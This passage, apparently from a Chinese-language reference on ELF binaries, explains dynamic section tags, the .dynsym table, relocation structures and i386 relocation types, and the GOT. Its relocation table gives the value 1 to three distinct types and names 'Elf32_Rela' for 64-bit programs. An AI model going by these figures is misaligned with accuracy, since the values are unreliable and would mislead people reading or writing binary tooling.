\u672a\u89c4\u5b9a\u5176\u5185\u5bb9\uff0c\u8bbf\u95ee\u8fd9\u4e9b\u6761\u76ee\u7684\u7a0b\u5e8f\u53ef\u80fd\u4e0e ABI \u4e0d\u517c\u5bb9\u3002 DT_TEXTREL 22 \u5ffd\u7565 \u53ef\u9009 \u53ef\u9009 \u5982\u679c\u6587\u4ef6\u4e2d\u4e0d\u5305\u542b\u6b64\u7c7b\u578b\u7684\u8868\u9879\uff0c\u5219\u8868\u793a\u6ca1\u6709\u4efb\u4f55\u91cd\u5b9a\u4f4d\u8868\u9879\u80fd\u591f\u9020\u6210\u5bf9\u4e0d\u53ef\u5199\u6bb5\u7684\u4fee\u6539\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u53ef\u80fd\u5b58\u5728\u82e5\u5e72\u91cd\u5b9a\u4f4d\u9879\u8bf7\u6c42\u5bf9\u4e0d\u53ef\u5199\u6bb5\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u505a\u76f8\u5e94\u7684\u51c6\u5907\u3002 DT_JMPREL 23 d_ptr \u53ef\u9009 \u53ef\u9009 \u8be5\u7c7b\u578b\u7684\u6761\u76ee\u7684 d_ptr \u6210\u5458\u5305\u542b\u4e86\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\uff0c\u5e76\u4e14\u7d22\u5f15\u65f6\u5e94\u8be5\u4f1a\u628a\u8be5\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7c7b\u578b\u7684\u6307\u9488\u3002\u628a\u91cd\u5b9a\u4f4d\u8868\u9879\u5206\u5f00\u6709\u5229\u4e8e\u8ba9\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u65f6\u5ffd\u7565\u5b83\u4eec\uff08\u5f00\u542f\u4e86\u5ef6\u8fdf\u7ed1\u5b9a\uff09\u3002\u5982\u679c\u5b58\u5728\u6b64\u6210\u5458\uff0c\u76f8\u5173\u7684 DT_PLTRELSZ \u548c DT_PLTREL \u5fc5\u987b\u4e5f\u5b58\u5728\u3002 DT_BIND_NOW 24 \u5ffd\u7565 \u53ef\u9009 \u53ef\u9009 \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5b58\u5728\u6b64\u7c7b\u578b\u7684\u8868\u9879\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9\u7a0b\u5e8f\u524d\uff0c\u5e94\u8be5\u5c06\u8be5\u6587\u4ef6\u7684\u6240\u6709\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u5730\u5740\u90fd\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u8fd9\u4e2a\u8868\u9879\u7684\u4f18\u5148\u6743\u9ad8\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6216\u8005dlopen(BA_LIB)\u6765\u8bbe\u7f6e\u3002 DT_LOPROC ~DT_HIPROC 0x70000000 ~0x7fffffff \u672a\u6307\u5b9a \u672a\u6307\u5b9a \u672a\u6307\u5b9a \u8fd9\u4e2a\u8303\u56f4\u7684\u8868\u9879\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u7279\u5b9a\u7684\u8bed\u4e49\u7684\u3002 \u6ca1\u6709\u51fa\u73b0\u5728\u6b64\u8868\u4e2d\u7684\u6807\u8bb0\u503c\u662f\u4fdd\u7559\u7684\u3002\u6b64\u5916\uff0c\u9664\u4e86\u6570\u7ec4\u672b\u5c3e\u7684 DT_NULL \u5143\u7d20\u4ee5\u53ca DT_NEEDED \u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f\u7ea6\u675f\u4ee5\u5916\uff0c \u5176\u4ed6\u8868\u9879\u53ef\u4ee5\u4ee5\u4efb\u610f\u987a\u5e8f\u51fa\u73b0\u3002 .dynstr \u00b6 .dynsym \u00b6 \u6982\u8ff0 \u00b6 \u52a8\u6001\u94fe\u63a5\u7684 ELF \u6587\u4ef6\u5177\u6709\u4e13\u95e8\u7684\u52a8\u6001\u7b26\u53f7\u8868\uff0c\u5176\u4f7f\u7528\u7684\u7ed3\u6784\u5c31\u662f Elf32_Sym\uff0c\u4f46\u662f\u5176\u5b58\u50a8\u7684\u8282\u4e3a .dynsym\u3002\u8fd9\u91cc\u518d\u6b21\u7ed9\u51fa Elf32_Sym \u7684\u7ed3\u6784 typedef struct { Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility under glibc>=2.2 */ Elf32_Section st_shndx; /* Section index */ } Elf32_Sym; \u9700\u8981\u6ce8\u610f\u7684\u662f .dynsym \u662f\u8fd0\u884c\u65f6\u6240\u9700\u7684\uff0cELF \u6587\u4ef6\u4e2d export/import \u7684\u7b26\u53f7\u4fe1\u606f\u5168\u5728\u8fd9\u91cc\u3002\u4f46\u662f\uff0c .symtab \u8282\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u662f\u7f16\u8bd1\u65f6\u7684\u7b26\u53f7\u4fe1\u606f\uff0c\u5b83\u4eec\u5728 strip \u4e4b\u540e\u4f1a\u88ab\u5220\u9664\u6389\u3002 \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u52a8\u6001\u7b26\u53f7\u4e2d\u7684\u4e24\u4e2a\u6210\u5458 st_name\uff0c \u8be5\u6210\u5458\u4fdd\u5b58\u7740\u52a8\u6001\u7b26\u53f7\u5728 .dynstr \u8868\uff08\u52a8\u6001\u5b57\u7b26\u4e32\u8868\uff09\u4e2d\u7684\u504f\u79fb\u3002 st_value\uff0c\u5982\u679c\u8fd9\u4e2a\u7b26\u53f7\u88ab\u5bfc\u51fa\uff0c\u8fd9\u4e2a\u7b26\u53f7\u4fdd\u5b58\u7740\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u3002 \u7b26\u53f7\u7248\u672c \u00b6 \u52a8\u6001\u7b26\u53f7\u4e0e\u6307\u5411\u5b83\u7684 Elf_Verdef \u4fdd\u5b58\u5728 .gnu.version \u6bb5\u4e2d\uff0c\u5176\u4e2d\uff0c\u7531 Elf_Verneed \u7ed3\u6784\u4f53\u6784\u6210\u7684\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u5bf9\u5e94\u52a8\u6001\u7b26\u53f7\u8868\u7684\u4e00\u9879\u3002\u5176\u5b9e\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5c31\u53ea\u6709\u4e00\u4e2a\u57df\uff1a\u90a3\u5c31\u662f\u4e00\u4e2a16\u4f4d\u7684\u6574\u6570\uff0c\u8868\u793a gnu.verion_r \u6bb5\u4e2d\u7684\u4e0b\u6807\u3002 \u5728\u8fd9\u6837\u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f7f\u7528 Elf_Rel \u7ed3\u6784\u4f53\u6210\u5458 r_info \u4e2d\u7684\u4e0b\u6807\u540c\u65f6\u4f5c\u4e3a .dynsym \u6bb5\u548c gnu.version \u6bb5\u7684\u4e0b\u6807\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e00\u4e00\u5bf9\u5e94\u5230\u6bcf\u4e00\u4e2a\u7b26\u53f7\u5230\u5e95\u662f\u90a3\u4e2a\u7248\u672c\u7684\u4e86\u3002 Relocation Related Sections \u00b6 \u94fe\u63a5\u5668\u5728\u5904\u7406\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u5bf9\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u67d0\u4e9b\u4f4d\u7f6e\u8fdb\u884c\u91cd\u5b9a\u4f4d\uff0c\u5373\u5c06\u7b26\u53f7\u6307\u5411\u6070\u5f53\u7684\u4f4d\u7f6e\uff0c\u786e\u4fdd\u7a0b\u5e8f\u6b63\u5e38\u6267\u884c\u3002\u4f8b\u5982\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u76f8\u5173\u7684\u8c03\u7528\u6307\u4ee4\u5fc5\u987b\u628a\u63a7\u5236\u6d41\u4ea4\u7ed9\u9002\u5f53\u7684\u76ee\u6807\u6267\u884c\u5730\u5740\u3002 \u5728 ELF \u6587\u4ef6\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 ELF \u8282\u90fd\u6709\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\uff0c\u6bd4\u5982\u8bf4 .text \u8282\u5982\u679c\u9700\u8981\u91cd\u5b9a\u4f4d\uff0c\u90a3\u4e48\u5176\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u4e3a .rel.text\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u5bfc\u5165\u67d0\u4e2a\u51fd\u6570\u65f6\uff0c.dynstr \u5c31\u4f1a\u5305\u542b\u5bf9\u5e94\u51fd\u6570\u540d\u79f0\u7684\u5b57\u7b26\u4e32\uff0c.dynsym \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u5177\u6709\u76f8\u5e94\u540d\u79f0\u7684\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u7b26\u53f7\uff08Elf_Sym\uff09\uff0c\u5728 rel.dyn \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u6307\u5411\u8fd9\u4e2a\u7b26\u53f7\u7684\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002 .rel(a).dyn & .rel(a).plt \u00b6 .rel.dyn \u5305\u542b\u4e86\u52a8\u6001\u94fe\u63a5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u53d8\u91cf\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5728\u52a0\u8f7d\u7684\u65f6\u5019\u5fc5\u987b\u5b8c\u5168\u786e\u5b9a\u3002\u800c .rel.plt \u5305\u542b\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u51fd\u6570\u7684\u4fe1\u606f\u3002\u8fd9\u4e24\u7c7b\u91cd\u5b9a\u4f4d\u8282\u90fd\u4f7f\u7528\u5982\u4e0b\u7684\u7ed3\u6784 typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; } Elf32_Rel; typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend; } Elf32_Rela; Elf32_Rela \u7c7b\u578b\u7684\u8868\u9879\u5305\u542b\u660e\u786e\u7684\u8865\u9f50\u4fe1\u606f\u3002 Elf32_Rel \u7c7b\u578b\u7684\u8868\u9879\u5728\u5c06\u88ab\u4fee\u6539\u7684\u4f4d\u7f6e\u4fdd\u5b58\u9690\u5f0f\u7684\u8865\u9f50\u4fe1\u606f\u3002\u7531\u4e8e\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u539f\u56e0\uff0c\u8fd9\u4e24\u79cd\u5f62\u5f0f\u90fd\u5b58\u5728\uff0c\u751a\u81f3\u662f\u5fc5\u9700\u7684\u3002\u56e0\u6b64\uff0c\u5bf9\u7279\u5b9a\u673a\u5668\u7684\u5b9e\u73b0\u53ef\u4ee5\u4ec5\u4f7f\u7528\u4e00\u79cd\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e\u4e0a\u4e0b\u6587\u4f7f\u7528\u4e24\u79cd\u5f62\u5f0f\u3002 \u4e00\u822c\u6765\u8bf4\uff0c32 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rel\uff0c64 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rela\u3002 \u5176\u4e2d\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b \u6210\u5458 \u8bf4\u660e r_offset \u6b64\u6210\u5458\u7ed9\u51fa\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u3002 \u5bf9\u4e8e\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u6b64\u503c\u662f\u4ece\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u6240\u5728\u8282\u533a\u5934\u90e8\u5f00\u59cb\u5230\u5c06\u88ab\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5b57\u8282\u504f\u79fb\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u800c\u8a00\uff0c\u5176\u53d6\u503c\u662f\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 \u865a\u62df\u5730\u5740 \uff0c\u4e00\u822c\u800c\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u6240\u8bf4\u7684 GOT \u8868\u7684\u5730\u5740\u3002 r_info \u6b64\u6210\u5458\u7ed9\u51fa\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u3002 \u4f8b\u5982\u4e00\u4e2a\u8c03\u7528\u6307\u4ee4\u7684\u91cd\u5b9a\u4f4d\u9879\u5c06\u5305\u542b\u88ab\u8c03\u7528\u51fd\u6570\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002\u5982\u679c\u7d22\u5f15\u662f STN_UNDEF\uff0c\u90a3\u4e48\u91cd\u5b9a\u4f4d\u4f7f\u7528 0 \u4f5c\u4e3a\u201c\u7b26\u53f7\u503c\u201d\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u7c7b\u578b\u662f\u548c\u5904\u7406\u5668\u76f8\u5173\u7684\u3002 r_addend \u6b64\u6210\u5458\u7ed9\u51fa\u4e00\u4e2a\u5e38\u91cf\u8865\u9f50\uff0c\u7528\u6765\u8ba1\u7b97\u5c06\u88ab\u586b\u5145\u5230\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u6570\u503c\u3002 \u5f53\u7a0b\u5e8f\u4ee3\u7801\u5f15\u7528\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u9879\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u6216\u8005\u7b26\u53f7\u8868\u7d22\u5f15\u65f6\uff0c\u8fd9\u4e2a\u7d22\u5f15\u662f\u5bf9\u8868\u9879\u7684 r_info \u6210\u5458\u5e94\u7528 ELF32_R_TYPE \u6216\u8005 ELF32_R_SYM \u7684\u7ed3\u679c\u3002 \u4e5f\u5c31\u662f\u8bf4 r_info \u7684\u9ad8\u4e09\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684\u503c\u8868\u793a\u8fd9\u4e2a\u52a8\u6001\u7b26\u53f7\u5728.dynsym\u7b26\u53f7\u8868\u4e2d\u7684\u4f4d\u7f6e\u3002 #define ELF32_R_SYM(i) ((i)>>8) #define ELF32_R_TYPE(i) ((unsigned char)(i)) #define ELF32_R_INFO(s,t) (((s)<<8)+(unsigned char)(t)) \u91cd\u5b9a\u4f4d\u8282\u533a\u4f1a\u5f15\u7528\u4e24\u4e2a\u5176\u5b83\u8282\u533a\uff1a \u7b26\u53f7\u8868\u3001\u8981\u4fee\u6539\u7684\u8282\u533a \u3002\u8282\u533a\u5934\u90e8\u7684 sh_info \u548c sh_link \u6210\u5458\u7ed9\u51fa\u76f8\u5e94\u7684\u5173\u7cfb\u3002 \u91cd\u5b9a\u4f4d\u7c7b\u578b \u00b6 \u91cd\u5b9a\u4f4d\u8868\u9879\u63cf\u8ff0\u4e86\u5982\u4f55\u4fee\u6539\u76f8\u5173\u7684\u6307\u4ee4\u4e0e\u6570\u636e\u57df\uff0c\u5176\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u5982\u4e0b \u5176\u4e2d\uff0cword32 \u6307\u5b9a\u4e86\u4e00\u4e2a 32 \u6bd4\u7279\u7684\u53d8\u91cf\uff0c\u5360\u7528 4 \u4e2a\u5b57\u8282\uff0c\u5bf9\u9f50\u65b9\u5f0f\u4efb\u610f\u3002\u8fd9\u4e9b\u503c\u4f7f\u7528\u548c Intel \u67b6\u6784\u4e2d\u5176\u5b83\u5b57\u7c7b\u4f3c\u7684\u5b57\u8282\u5e8f\uff0c\u4e00\u822c\u90fd\u662f\u5c0f\u7aef\u5e8f\u3002 \u5728\u4e0b\u9762\u7684\u8ba1\u7b97\u4e2d\uff0c\u6211\u4eec\u5047\u8bbe\u662f\u628a\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u4ece\u6982\u5ff5\u4e0a\u8bb2\uff0c\u94fe\u63a5\u5668\u4f1a\u628a\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5408\u5e76\u8d77\u6765\u5f97\u5230\u8f93\u51fa\u6587\u4ef6\u3002\u5b83\u9996\u5148\u8981\u51b3\u5b9a\u5982\u4f55\u7ed3\u5408\u5e76\u653e\u7f6e\u8fd9\u4e9b\u8f93\u5165\u6587\u4ef6\uff0c\u7136\u540e\u66f4\u65b0\u7b26\u53f7\u8868\u7684\u503c\uff0c\u6700\u540e\u624d\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u91cd\u5b9a\u4f4d\u65b9\u6cd5\u662f\u76f8\u4f3c\u7684\uff0c\u5e76\u4e14\u7ed3\u679c\u51e0\u4e4e\u4e00\u6837\u3002\u5728\u540e\u9762\u7684\u63cf\u8ff0\u4e2d\u6211\u4eec\u5c06\u4f1a\u91c7\u7528\u5982\u4e0b\u8bb0\u53f7\u3002 A(addend) \u7528\u6765\u8ba1\u7b97\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u53d6\u503c\u7684\u8865\u9f50\u3002 B(base) \u8868\u793a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u865a\u62df\u57fa\u5730\u5740\u4e3a0\uff0c\u4f46\u662f\u5728\u6267\u884c\u65f6\uff0c\u5176\u5730\u5740\u5374\u4f1a\u53d1\u751f\u6539\u53d8\u3002 G(Global) \u8868\u793a\u5728\u6267\u884c\u65f6\u91cd\u5b9a\u4f4d\u9879\u7684\u7b26\u53f7\u5728\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u504f\u79fb\u3002 GOT (global offset table) \u8868\u793a\u5168\u5c40\u504f\u79fb\u8868\uff08GOT\uff09\u7684\u5730\u5740\u3002 L (linkage) \u8868\u793a\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4e2d\u4e00\u4e2a\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4f1a\u628a\u51fd\u6570\u8c03\u7528\u91cd\u5b9a\u4f4d\u5230\u6b63\u786e\u7684\u76ee\u6807\u4f4d\u7f6e\u3002\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u6784\u9020\u521d\u59cb\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u7136\u540e\u52a8\u6001\u94fe\u63a5\u5668\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u4fee\u6539\u8fd9\u4e9b\u9879\u76ee\u3002 P (place) \u8868\u793a\u88ab\u91cd\u5b9a\u4f4d\uff08\u7528 r_offset \u8ba1\u7b97\uff09\u7684\u5b58\u50a8\u5355\u5143\u7684\u4f4d\u7f6e\uff08\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\uff09\u3002 S (symbol) \u8868\u793a\u7d22\u5f15\u4f4d\u4e8e\u91cd\u5b9a\u4f4d\u9879\u4e2d\u7684\u7b26\u53f7\u7684\u53d6\u503c\u3002 \u91cd\u5b9a\u4f4d\u9879\u7684 r_offset \u53d6\u503c\u4e3a\u53d7\u5f71\u54cd\u7684\u5b58\u50a8\u5355\u5143\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u6216\u8005\u865a\u62df\u5730\u5740\u3002\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7ed9\u51fa\u9700\u8981\u4fee\u6539\u7684\u6bd4\u7279\u4f4d\u4ee5\u53ca\u5982\u4f55\u8ba1\u7b97\u5b83\u4eec\u7684\u503c\u3002\u5176\u4e2d\uff0cIntel \u67b6\u6784\u53ea\u4f7f\u7528 ELF32_REL \u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5c06\u8981\u88ab\u91cd\u5b9a\u4f4d\u7684\u6210\u5458\u4fdd\u7559\u5bf9\u5e94\u7684\u8865\u9f50\u6570\u503c\u3002\u5728\u6240\u6709\u7684\u60c5\u51b5\u4e0b\uff0c\u8865\u9f50\u7684\u6570\u503c\u4e0e\u8ba1\u7b97\u7684\u7ed3\u679c\u4f7f\u7528\u76f8\u540c\u7684\u5b57\u8282\u5e8f\u3002 \u91cd\u5b9a\u4f4d\u7c7b\u578b\u4ee5\u53ca\u90e8\u5206\u542b\u4e49\u5982\u4e0b \u540d\u79f0 \u503c \u57df \u8ba1\u7b97 \u542b\u4e49 R_386_NONE 0 \u65e0 \u65e0 R_386_32 1 word32 S + A R_386_PC32 1 word32 S + A - P R_386_GOT32 1 word32 G + A - P \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u4ece\u5168\u5c40\u504f\u79fb\u8868\u57fa\u5740\u5230\u7b26\u53f7\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u7684\u8ddd\u79bb\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002 R_386_PLT32 1 word32 L + A - P \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5730\u5740\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002 R_386_COPY 5 \u65e0 \u65e0 \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u6307\u5411\u53ef\u5199\u6bb5\u4e2d\u7684\u4f4d\u7f6e\u3002\u7b26\u53f7\u8868\u89c4\u5b9a\u8fd9\u79cd\u7b26\u53f7\u5e94\u65e2\u5b58\u5728\u4e8e\u5f53\u524d\u76ee\u6807\u6587\u4ef6\u53c8\u8be5\u5b58\u5728\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4e0e\u8be5\u5171\u4eab\u76ee\u6807\u7b26\u53f7\u76f8\u5173\u7684\u6570\u636e\u590d\u5236\u5230\u7531\u4e0a\u8ff0\u504f\u79fb\u91cf\u6307\u5b9a\u7684\u4f4d\u7f6e\u3002 R_386_GLOB_DAT 6 word32 S \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7528\u4e8e\u628a\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u7b26\u53f7\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7b26\u53f7\u7684\u5730\u5740\u3002\u8fd9\u4e2a\u7279\u6b8a\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u5141\u8bb8\u786e\u5b9a\u7b26\u53f7\u548c\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e4b\u95f4\u7684\u5173\u7cfb\u3002 R_386_JMP_SLOT 7 word32 S \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u76f8\u5e94\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4fee\u6539\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u4ece\u800c\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e0a\u8ff0\u6307\u51fa\u7684\u7b26\u53f7\u5730\u5740\u3002 R_386_RELATIVE 8 word32 B + A \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u4e2d\u7684\u4e00\u4e2a\u5305\u542b\u4e86\u67d0\u4e2a\u4ee3\u8868\u76f8\u5bf9\u5730\u5740\u7684\u503c\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u901a\u8fc7\u628a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88c5\u8f7d\u5230\u7684\u865a\u62df\u5730\u5740\u4e0e\u4e0a\u8ff0\u76f8\u5bf9\u5730\u5740\u76f8\u52a0\u6765\u8ba1\u7b97\u5bf9\u5e94\u865a\u62df\u5730\u5740\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u9879\u8bbe\u7f6e\u7b26\u53f7\u8868\u7d22\u5f15\u4e3a0\u3002 R_386_GOTOFF 9 word32 S + A - GOT \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u503c\u4e0e\u5168\u5c40\u504f\u79fb\u8868\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u901a\u77e5\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002 R_386_GOTPC 10 word32 S + A - P \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u4e0e R_386_PC32 \u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5728\u8ba1\u7b97\u65f6\u4f7f\u7528\u5168\u5c40\u504f\u79fb\u8868\u7684\u5730\u5740\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8be5\u91cd\u5b9a\u4f4d\u8868\u9879\u4e2d\u88ab\u5f15\u7528\u7684\u7b26\u53f7\u662f _GLOBAL_OFFSET_TABLE_ \uff0c\u5b83\u4f1a\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002 Global Offset Table \u00b6 GOT \u8868\u5728 ELF \u6587\u4ef6\u4e2d\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 .got\uff0c\u5b58\u50a8\u5168\u5c40\u53d8\u91cf\u7684\u5f15\u7528\u3002 .got.plt\uff0c\u5b58\u50a8\u51fd\u6570\u7684\u5f15\u7528\u3002 \u5176\u76f8\u5e94\u7684\u503c\u7531\u80fd\u591f\u89e3\u6790.rel.plt \u6bb5\u4e2d\u7684\u91cd\u5b9a\u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u5668\u6765\u586b\u5199\u3002 